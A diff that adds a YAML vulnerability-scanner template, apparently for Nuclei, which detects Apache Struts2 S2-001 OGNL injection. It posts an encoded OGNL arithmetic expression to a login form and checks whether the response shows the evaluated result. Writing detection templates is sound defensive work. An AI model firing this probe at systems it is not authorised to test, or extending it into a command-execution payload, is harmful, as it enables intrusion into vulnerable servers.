@@ -1,0 +1,38 @@
+id: struts2-s2-001-ognl-injection
+
+info:
+  name: Apache Struts2 S2-001 OGNL Injection
+  author: custom
+  severity: critical
+  description: |
+    OGNL expression injection in Struts2 validation error messages.
+    When form validation fails, Struts2 re-renders the form with the
+    submitted value — if the value contains OGNL expressions, they
+    execute during re-rendering.
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/S2-001
+  tags: struts2,ognl,rce,s2-001
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login.action"
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=%25%7B2*3333%7D&password=test"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "6666"
+
+    extractors:
+      - type: regex
+        regex:
+          - "6666"
